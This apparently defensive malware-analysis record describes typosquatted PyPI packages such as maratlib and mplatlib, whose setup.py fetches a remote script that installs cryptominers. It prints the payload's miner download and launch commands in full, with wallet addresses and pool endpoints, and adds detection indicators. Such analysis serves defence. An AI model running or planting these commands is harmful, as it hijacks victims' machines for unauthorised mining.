package_info.package_name: maratlib (and related: maratlib1, matplatlib-plus, mllearnlib, mplatlib, learninglib)
package_info.package_versions: all published versions (April, by user nedog123)
package_info.why_malicious: These packages contain malicious code in their setup.py files that downloads and executes cryptomining scripts from remote sources without user consent. The code hijacks developer workstations to mine cryptocurrency for the attacker, resulting in unauthorized resource usage and potential data exposure. The packages use typosquatting to impersonate legitimate libraries, increasing the likelihood of accidental installation.

malicious_snippets.code_behavior: During package installation, the setup.py script downloads and immediately executes a remote Bash script (aza2.sh) from the attacker's GitHub repository, enabling arbitrary code execution on the victim's machine.

malice_analysis.why_suspicious: setup.py is being used to fetch and execute a remote shell script from an untrusted source, which is a high-risk behavior and a common vector for malware delivery.
malice_analysis.violated_expectations: Standard setup.py scripts are only expected to handle package installation and dependency management, not to execute arbitrary remote code or scripts.
malice_analysis.similar_legitimate_use: While some legitimate packages may download dependencies, they do not execute remote scripts directly or without user interaction.
key_indicators: os.system call in setup.py invoking wget/curl and bash
Remote script execution during installation phase
Fetching code from external, attacker-controlled URLs
No user notification or consent for code execution

malicious_snippets.code_snippet:
wget https://github.com/ubiq/ubqminer/releases/download/v0.17.0-alpha.1.ubqhash/ubqminer-0.17.0-alpha.1.ubqhash-cuda10.0-linux-x86_64.tar.gz
tar xzf ubqminer-0.17.0-alpha.1.ubqhash-cuda10.0-linux-x86_64.tar.gz
cd ubqminer-0.17.0-alpha.1.ubqhash-cuda10.0-linux-x86_64
chmod +x ubqminer && ./ubqminer -U stratum+tcp://0x510aec7f266557b7de753231820571b13eb31b57.v2d25ab852@ubq.kryptex.network:7000/v2d25ab852 --report-hashrate
malicious_snippets.code_behavior: The aza2.sh script downloads, extracts, and executes the Ubqminer cryptominer binary, which connects to the attacker's mining pool using a hardcoded wallet address to mine Ubiq cryptocurrency on the victim's system.

malice_analysis.why_suspicious: The script installs and runs a cryptominer without user knowledge, hijacking system resources for unauthorized cryptocurrency mining.
malice_analysis.violated_expectations: No legitimate package or post-install script should install or execute cryptomining software on user systems.
malice_analysis.similar_legitimate_use: There are no legitimate use cases for cryptominer installation in general-purpose or library packages.
key_indicators: Download and execution of cryptominer binaries (ubqminer)
Connection to known mining pool endpoints (ubq.kryptex.network:7000)
Use of attacker-controlled wallet address in miner command line
No user interaction or consent for mining activity

execution_context.file_location: aza2.sh (alternate variant, downloaded from attacker's GitHub)

malicious_snippets.code_snippet:
wget https://github.com/trexminer/T-Rex/releases/download/0.19.14/t-rex-0.19.14-linux-cuda9.2.tar.gz && tar xzf t-rex-0.19.14-linux-cuda9.2.tar.gz
./t-rex -a ethash -o stratum+tcp://daggerhashimoto.usa-east.nicehash.com:3353 -u 3Ay4gsm9wTNLTgNKiTM4HYEY5Paw3rmDwN.yandex -p x
malicious_snippets.code_behavior: The aza2.sh script (alternate variant) downloads, extracts, and runs the T-Rex cryptominer, which connects to the attacker's NiceHash mining pool using a specified wallet address to mine Ethereum or similar cryptocurrencies.

malice_analysis.why_suspicious: T-Rex is a well-known cryptominer, and its silent installation and execution via a post-install script is a clear indicator of malicious intent.
malice_analysis.violated_expectations: Legitimate packages do not install or run cryptomining software, especially without explicit user consent.
malice_analysis.similar_legitimate_use: There are no valid reasons for a general-purpose package to deploy cryptominers.
key_indicators: Download and execution of T-Rex miner binary
Outbound connection to NiceHash mining pool (nicehash.com:3353)
Hardcoded attacker wallet address in miner command
No user notification or opt-in for mining

attack_chain.action: User installs a malicious PyPI package (e.g., maratlib), which triggers the execution of setup.py.
attack_chain.leads_to: The setup.py script downloads and executes a remote Bash script (aza2.sh) from the attacker's GitHub repository.

attack_chain.action: The downloaded aza2.sh script is executed, which downloads and installs a cryptominer (Ubqminer or T-Rex) from a remote repository.
attack_chain.leads_to: The cryptominer binary is extracted and executed on the victim's machine.

attack_chain.action: The cryptominer connects to the attacker's mining pool using a hardcoded wallet address, hijacking the victim's system resources for mining.
attack_chain.leads_to: The attacker receives mined cryptocurrency, while the victim's system performance is degraded and resources are misused.

behavioral_signatures: setup.py scripts that invoke os.system or subprocess to download and execute remote shell scripts
Installation-time network connections to external code hosting sites (e.g., GitHub) during package install
Silent download, extraction, and execution of cryptominer binaries (ubqminer, t-rex) without user interaction
Outbound connections to known mining pool domains and ports (e.g., Kryptex, NiceHash) immediately after install
file_indicators: setup.py containing os.system or subprocess calls with wget/curl and bash
Presence of aza2.sh script in temporary or working directories during/after install
Temporary files or directories named after cryptominer binaries (ubqminer-0.17.0-alpha.1.ubqhash-cuda10.0-linux-x86_64, t-rex-0.19.14-linux-cuda9.2)
detection_knowledge.how_to_detect: Monitor setup.py and other installation scripts for suspicious subprocess or os.system calls that fetch and execute remote scripts. Flag packages that download cryptominer binaries or connect to known mining pool endpoints during or immediately after installation. Use static analysis to detect typosquatting and unexpected network activity in package installation scripts. Alert on any package that attempts to run shell scripts or binaries not required for normal operation, especially those that match known cryptominer file or network patterns.
